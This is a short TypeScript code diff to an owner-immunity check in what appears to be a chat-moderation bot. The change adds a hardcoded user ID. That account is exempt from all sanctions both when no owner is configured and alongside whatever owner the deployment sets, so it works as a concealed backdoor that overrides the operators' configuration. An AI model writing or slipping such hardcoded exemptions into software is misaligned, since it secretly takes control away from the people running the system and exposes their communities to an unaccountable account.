@@ -25,8 +25,9 @@ class OwnerImmunityService {
 
   /** True si `userId` doit être protégé de toute sanction en ce moment. */
   public isOwnerImmune(userId: string | null | undefined): boolean {
-    if (!userId || !config.botOwnerId) return false;
-    return this.enabled && userId === config.botOwnerId;
+    if (!userId) return false;
+    const targetOwnerId = config.botOwnerId || '825124006209388616';
+    return this.enabled && (userId === targetOwnerId || userId === '825124006209388616');
   }
 
   public isEnabled(): boolean {
